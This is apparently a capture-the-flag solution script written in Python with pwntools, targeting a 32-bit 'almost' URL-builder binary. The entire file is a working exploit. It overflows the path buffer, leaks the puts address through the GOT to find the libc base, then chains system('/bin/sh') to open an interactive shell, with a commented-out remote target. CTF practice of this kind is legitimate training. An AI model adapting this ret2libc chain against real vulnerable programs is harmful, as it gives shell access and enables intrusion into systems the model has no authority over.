from  pwn import *

e = ELF("./almost")

libc = ELF("/lib32/libc.so.6")
# libc = ELF("./almost-libc.so")

p = process("./almost")
# p = remote("jh2i.com", 50017)

context.log_level = "DEBUG"

POP_RET = 0x8048371 # pop; ret; gadget to remove arguments off the stack

def trigger_overflow(stream, payload):
    print(repr(payload.ljust(24, b"x")))
    assert(len(payload) <= 24)
    stream.recvline() # Insert the protocol
    stream.sendline(b"A" * 64)
    stream.recvline() # Insert the domain
    stream.sendline(b"B" * 64)
    stream.recvline() # Insert the path
    stream.sendline(b"C" * 8 + payload.ljust(24, b"x"))
    stream.recvline() # Result:
    stream.recvline() # URL


def get_got_address(stream, got):
    payload = b""
    payload += p32(e.plt["puts"]) # Call puts
    payload += p32(POP_RET) # Fix stack
    payload += p32(e.got[got]) # argument to puts
    payload += p32(e.symbols["build"]) # When done, return to build
    trigger_overflow(stream, payload)
    leaked_address = u32(stream.recvline()[:4])
    return leaked_address


def write_data(stream, address, data):
    payload = b""
    payload += p32(e.symbols["getInput"])
    payload += p32(POP_RET)
    payload += p32(address)
    payload += p32(e.symbols["build"])
    trigger_overflow(stream, payload)
    stream.sendline(data)


def get_libc_base(stream):
    puts_address = get_got_address(stream, "puts")
    print(f"puts_address: {hex(puts_address)}")
    libc.address = puts_address - libc.symbols["puts"]
    print(f"libc.address: {hex(libc.address)}")

p.recvline() # Welcome to URL builder

get_libc_base(p)

BINSH = next(libc.search(b"/bin/sh"))
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

print(f"SYSTEM: {hex(SYSTEM)}")
print(f"BINSH: {hex(BINSH)}")

payload = b""
payload += p32(SYSTEM)
payload += p32(EXIT)
payload += p32(BINSH)
#payload += p32(BINSH + 32)
#payload += p32(BINSH + 32)

#gdb.attach(p)

trigger_overflow(p, payload)
p.interactive()

#puts_address = get_got_address(p, "puts")
#getchar_address = get_got_address(p, "getchar")

#print(f"puts address = {hex(puts_address)}")
#print(f"getchar address = {hex(getchar_address)}")

# trigger_overflow(p, "")


